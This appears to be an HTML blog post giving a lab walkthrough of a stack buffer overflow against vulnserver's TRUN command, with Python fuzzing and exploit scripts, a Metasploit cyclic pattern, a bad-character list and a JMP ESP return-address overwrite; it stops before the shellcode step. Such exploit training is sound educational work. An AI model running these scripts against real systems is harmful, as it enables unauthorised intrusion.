<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Buffer Overflow | John Munene</title>
<meta name="keywords" content="">
<meta name="description" content="Don&#39;t let buffer overflows overflow your mind">
<meta name="author" content="">
<link rel="canonical" href="/posts/buffer_overflow/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.bc1149f4a72aa4858d3a9f71462f75e5884ffe8073ea9d6d5761d5663d651e20.css" integrity="sha256-vBFJ9KcqpIWNOp9xRi915YhP/oBz6p1tV2HVZj1lHiA=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
<link rel="apple-touch-icon" href="apple-touch-icon.png">
<link rel="mask-icon" href="safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="Buffer Overflow" />
<meta property="og:description" content="Don&#39;t let buffer overflows overflow your mind" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/buffer_overflow/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-10-21T18:58:33+03:00" />
<meta property="article:modified_time" content="2022-10-21T18:58:33+03:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Buffer Overflow"/>
<meta name="twitter:description" content="Don&#39;t let buffer overflows overflow your mind"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Posts",
      "item": "/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "Buffer Overflow",
      "item": "/posts/buffer_overflow/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Buffer Overflow",
  "name": "Buffer Overflow",
  "description": "Don't let buffer overflows overflow your mind",
  "keywords": [
    
  ],
  "articleBody": "Introduction A buffer overflow or a buffer overrun is an anomaly where a program, while writing data to a buffer, overruns the buffer’s boundary and overwrites the adjacent memory locations.\nAnatomy of Stack The stack is a section of memory that stores temporary data that is executed when a function is called. It always grows downwards towards lower values as information is added to it. Information placed in the buffer space should stop at the Extended Base Pointer (EBP). In a buffer overflow, information escapes the buffer space and reaches the Extended Instruction Pointer (EIP). If an attacker can gain control of EIP, they can use the pointer to point to malicious code and gain reverse shell/remote shell/connect-back shell\nTools to be Used and Setup  Virtual Box - We are going to install Kali Linux and Windows 10 Enterprise in Virtual Box. Kali Linux - This will act as the attacker machine Windows 10 Enterprise - This is going to be the victim machine. Install vulnserver (A Windows based threaded TCP server application that is designed to be exploited ) in this machine. Also, install Immunity Debugger in this machine. Ensure that Windows Security Defender has been disabled because if otherwise, it is going to block vulnserver from running.  Steps to be Covered  Fuzzing   This is a method that we are going to use to send a bunch of characters to the vulnerable program in an attempt to break it. For this walkthrough, I will be using the TRUN command to crash vulnserver. On the Windows Machine, we are going to run vulnserver as administrator. We are also going to run Immunity Debugger as administrator and attach vulnserver to Immunity Debugger. After attaching, vulnserver to immunity debugger, be sure to run immunity debugger. We are going to write a Python fuzzing script to get the fuzzing job done. So for that we fire up a terminal in the Kali Linux machine and create a new script named fuzzing.py  a. Import the necessary libraries #! /usr/bin/python3 import socket, sys from time import sleep b. Define the Buffer Variable to Store Our Characters and Create a socket IP = \"10.6.59.114\" port = 9999 buffer = \"A\" * 100 trun = 'TRUN /.:/' while true: try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((IP,port)) s.send((trun.encode()+buffer.encode())) s.close() s.sleep(1) buffer = buffer + \"A\" *100 except: print(\"Your buffer crashed at %s bytes\" % str(len(buffer))) sys.exit() You should see this output after running it This means that vulnserver has actually crashed. Checking Immunity Debugger, you should see An Access Violation above the task bar. We sent a bunch of As in increasing iteration until the buffer space overflown overwriting adjacent registers and the program crashed.\nFinding the Offset   After breaking vulnserver, we want to know at what exact point the program crashed. We will use a tool known as pattern_create.rb provided by metasploit framework. We will restart vulnserver and immunity debugger as administrator. We then reattach vulnserver to immunity debugger. Remember to run immunity debugger. Then on the Kali Linux terminal we will run the following command: /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3500 . It’s to generate some code that we are going to copy and use in our python script.  We edit our python script to look like this and run it:\n#! /usr/bin/python import sys,socket IP = '10.6.59.114' port = 9999 trun = 'TRUN /.:/' offset = \"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em\" try: s=socket.socket() s.connect((IP,port)) s.send((trun.encode() +offset.encode())) s.close() except: print(\"Error connecting to server\") sys.exit() When we check Immunity debugger, we should see a value at the EIP. This is the value we are interested in. In my case it is 386F4337 as can be seen below. We restart vulnserver and immunity debugger as administrator and reattach vulnserver to immunity debugger. we run immunity debugger, then in our Kali Linux Machine we run the following command and use the value that we obtained in the EIP in the command. /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3500 -q 386F4337 . We should see an ouput like this in the Kali terminal.\nAt 2003 bytes we can control the EIP.\nOverwriting the EIP  We are going to use the offset to overwrite the EIP. We will need to modify our python script to look like the code below\n#! /usr/bin/python3 import socket, sys IP = \"10.6.59.114\" port =9999 trun = 'TRUN /.:/' shellcode = \"A\" *2003 + \"B\" * 4 try: s= socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((IP,port)) s.send((trun.encode()+shellcode.encode())) s.close() except: print(\"Error while connecting\") sys.exit() We run the script.\nChecking immunity debugger, we can see that we have successfully overwritten the EIP with 4Bs (42424242). This means we have controlled the EIP. Finding Bad Characters  Finding bad characters is in relation to generating shellcode. When generating shellcode, we need to knpow which charaters are good for the shellcode and which ones are bad for the shellcode. We can do this by running all the hex characters through our program and seeing what characters act up. By default the null byte x00 is a bad character for the shellcode. When we google badchars we can find this\n badchars = ( \"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\" \"\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\" \"\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\" \"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\" \"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\" \"\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\" \"\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\" \"\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\" \"\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\" \"\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\" \"\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\" \"\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\" \"\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\" \"\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\" \"\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\" \"\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\" ) Then we edit our Python script to include the badchars variable. It should look like this:\n#! /usr/bin/python3 import socket, sys IP = \"10.6.59.114\" port =9999 badchars = ( \"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\" \"\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\" \"\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\" \"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\" \"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\" \"\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\" \"\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\" \"\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\" \"\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\" \"\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\" \"\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\" \"\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\" \"\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\" \"\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\" \"\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\" \"\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\" ) trun = 'TRUN /.:/' shellcode = \"A\" *2003 + \"B\" * 4 try: s= socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((IP,port)) s.send((trun.encode()+shellcode.encode())) s.close() except: print(\"Error while connecting\") sys.exit() When we run the script we see that we overwrite the EIP. What we are now looking out for is the Hex Dump. We want to find which characters in the Hex Dump are out of place. Heads up there are no bad characters in this but at times there are bad characters. But this is an eye test that you have to do when doing buffer overflows.\nFinding the Right Module  When looking for the right module what we are looking for is a dll or something similar inside of our program that has no memory protection. Meaning no DEP,ASLR, SEH etc. There is a tool out there called mona modules that we can use with immunity debugger to achieve this. Make sure to place the mona.py file in this path (C:\\Program Files\\Immunity Inc\\Immunity Debugger\\PyCommands) in the Windows machine. We want to find the opcode equivalent(converting Assembly Language to Hex Code) so we run this on the kali terminal. /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb\nRun JMP ESP So the Hex Code equivalent of JMP ESP is ffe4\nWe then go to Immunity and type this  !mona find -s \"\\xff\\xe4\" -m essfunc.dll This gives us a return address. We enter the return address in little endian. This is because x86 stores the low order byte in low order address and the high order byte in high order address.\nWe then edit our Python script to look like this\n#! /usr/bin/python3 import socket, sys IP = \"10.6.59.114\" port =9999 trun = 'TRUN /.:/' shellcode = \"A\" *2003 + \"\\xaf\\x11\\x50\\x62\" try: s= socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((IP,port)) s.send((trun.encode()+shellcode.encode())) s.close() except: print(\"Error while connecting\") sys.exit() This means that in the EIP, instead of having 4Bs, we are having a JMP code. This code is going to jump to some malicious code.\nWe then set a breakpoint so that when our program is executing and the buffer is overflown we stop at the EIP and wait for further instructions. We have no place we are jumping to for now.\nSo we then execute our python script.\nIf we look at the registers now we see that we have successfully controlled the EIP.\nGenerating Shellcode and Gaining Shell  We are going to use a tool known as msfvenom\n",
  "wordCount" : "1286",
  "inLanguage": "en",
  "datePublished": "2022-10-21T18:58:33+03:00",
  "dateModified": "2022-10-21T18:58:33+03:00",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "/posts/buffer_overflow/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "John Munene",
    "logo": {
      "@type": "ImageObject",
      "url": "favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="" accesskey="h" title="John Munene (Alt + H)">John Munene</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="/posts/" title="Posts">
                    <span>Posts</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title">
      Buffer Overflow
    </h1>
    <div class="post-description">
      Don&#39;t let buffer overflows overflow your mind
    </div>
    <div class="post-meta"><span title='2022-10-21 18:58:33 +0300 EAT'>October 21, 2022</span>

</div>
  </header> 
  <div class="post-content"><h2 id="introduction">Introduction<a hidden class="anchor" aria-hidden="true" href="#introduction">#</a></h2>
<p>A buffer overflow or a buffer overrun is an anomaly where a program, while writing data to a buffer, overruns the buffer&rsquo;s boundary and overwrites the adjacent memory locations.</p>
<h4 id="anatomy-of-stack">Anatomy of Stack<a hidden class="anchor" aria-hidden="true" href="#anatomy-of-stack">#</a></h4>
<p><img loading="lazy" src="/stack.png" alt=""  />
</p>
<p>The stack is a section of memory that stores temporary data that is executed when a function is called. It always grows downwards towards lower values as information is added to it. Information placed in the buffer space should stop at the Extended Base Pointer (EBP). In a buffer overflow, information escapes the buffer space and reaches the Extended Instruction Pointer (EIP). If an attacker can gain control of EIP, they can use the pointer to point to malicious code and gain reverse shell/remote shell/connect-back shell</p>
<h2 id="tools-to-be-used-and-setup">Tools to be Used and Setup<a hidden class="anchor" aria-hidden="true" href="#tools-to-be-used-and-setup">#</a></h2>
<ol>
<li>Virtual Box - We are going to install Kali Linux and Windows 10 Enterprise in Virtual Box.</li>
<li>Kali Linux - This will act as the attacker machine</li>
<li>Windows 10 Enterprise - This is going to be the victim machine. Install <code>vulnserver</code> (A Windows based threaded TCP server application that is designed to be exploited ) in this machine. Also, install <code>Immunity Debugger</code> in this machine. Ensure that <code>Windows Security Defender</code> has been disabled because if otherwise, it is going to block <code>vulnserver</code> from running.</li>
</ol>
<h2 id="steps-to-be-covered">Steps to be Covered<a hidden class="anchor" aria-hidden="true" href="#steps-to-be-covered">#</a></h2>
<ol>
<li>Fuzzing</li>
</ol>
<ul>
<li>This is a method that we are going to use to send a bunch of characters to the vulnerable program in an attempt to break it. For this walkthrough, I will be using the <code>TRUN</code> command to crash vulnserver. On the Windows Machine, we are going to run vulnserver as administrator. We are also going to run Immunity Debugger as administrator and attach vulnserver to Immunity Debugger. After attaching, vulnserver to immunity debugger, be sure to run immunity debugger. We are going to write a Python fuzzing script to get the fuzzing job done. So for that we fire up a terminal in the Kali Linux machine and create a new script named <code>fuzzing.py</code></li>
</ul>
<h4 id="a-import-the-necessary-libraries">a. Import the necessary libraries<a hidden class="anchor" aria-hidden="true" href="#a-import-the-necessary-libraries">#</a></h4>
<pre tabindex="0"><code class="language-{Python}" data-lang="{Python}">#! /usr/bin/python3

import socket, sys
from time import sleep
</code></pre><h4 id="b-define-the-buffer-variable-to-store-our-characters-and-create-a-socket">b. Define the Buffer Variable to Store Our Characters and Create a socket<a hidden class="anchor" aria-hidden="true" href="#b-define-the-buffer-variable-to-store-our-characters-and-create-a-socket">#</a></h4>
<pre tabindex="0"><code class="language-{Python}" data-lang="{Python}">IP = &quot;10.6.59.114&quot;
port = 9999

buffer = &quot;A&quot; * 100
trun = 'TRUN /.:/'
while true:
        try:
           s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
           s.connect((IP,port))
           s.send((trun.encode()+buffer.encode()))
           s.close()

           s.sleep(1)
           buffer = buffer + &quot;A&quot; *100

        except:
            print(&quot;Your buffer crashed at %s bytes&quot; % str(len(buffer)))
            sys.exit()  
            
</code></pre><p>You should see this output after running it
<img loading="lazy" src="/fuzzing.png" alt=""  />

This means that vulnserver has actually crashed. Checking Immunity Debugger, you should see An <em>Access Violation</em> above the task bar.
We sent a bunch of As in increasing iteration until the buffer space overflown overwriting adjacent registers and the program crashed.</p>
<ol start="2">
<li>Finding the Offset</li>
</ol>
<ul>
<li>After breaking vulnserver, we want to know at what exact point the program crashed. We will use a tool known as <code>pattern_create.rb</code> provided by <code>metasploit framework</code>. We will restart vulnserver and immunity debugger as administrator. We then reattach vulnserver to immunity debugger. Remember to run immunity debugger. Then on the Kali Linux terminal we will run the following command:
<code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3500 </code>. It&rsquo;s to generate some code that we are going to copy and use in our python script.</li>
</ul>
<p>We edit our python script to look like this and run it:</p>
<pre tabindex="0"><code class="language-{Python}" data-lang="{Python}">#! /usr/bin/python

import sys,socket

IP = '10.6.59.114'
port = 9999
trun = 'TRUN /.:/'

